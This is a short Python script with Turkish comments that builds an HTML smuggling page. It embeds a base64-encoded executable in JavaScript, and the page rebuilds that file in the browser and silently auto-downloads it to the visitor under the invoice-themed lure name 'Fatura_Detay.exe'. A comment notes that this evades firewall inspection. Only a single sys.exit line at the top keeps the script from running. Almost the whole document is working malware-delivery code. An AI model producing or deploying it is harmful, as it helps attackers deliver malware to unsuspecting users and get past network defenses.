import base64
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod tarayıcı içinde zararlı dosya oluşturur.")

print("--- WEAPONIZED HTML SMUGGLING ---")

def build_smuggling_page():
    # 1. PAYLOAD (Weaponized Part)
    # Simülasyon: "Merhaba Dünya" (Text)
    # Gerçek: Zararlı yazılımın Base64 hali.
    
    with open("virus.exe", "rb") as f:
        binary_data = f.read()
    
    b64_payload = base64.b64encode(binary_data).decode()
    
    # 2. JAVASCRIPT BLOB
    # Dosya sunucudan gelmez, tarayıcının RAM'inde oluşturulur.
    # Bu yüzden Firewall trafiği göremez.
    
    html_code = f"""
    <html>
    <body>
    <h1>Lütfen Bekleyiniz...</h1>
    <script>
        var file_data = "{b64_payload}";
        var blob = new Blob([atob(file_data)], {{type: "octet/stream"}});
        var fileName = "Fatura_Detay.exe";
        
        // Otomatik İndirme Tetikleyici
        var a = document.createElement("a");
        document.body.appendChild(a);
        a.style = "display: none";
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
    </script>
    </body>
    </html>
    """
    
    with open("index.html", "w") as f:
        f.write(html_code)
        
    print("💀 'index.html' OLUŞTURULDU.")
    print("Bu dosya açıldığında ağdan dosya indirmez, dosyayı KENDİ İÇİNDE oluşturur.")

if __name__ == "__main__":
    build_smuggling_page()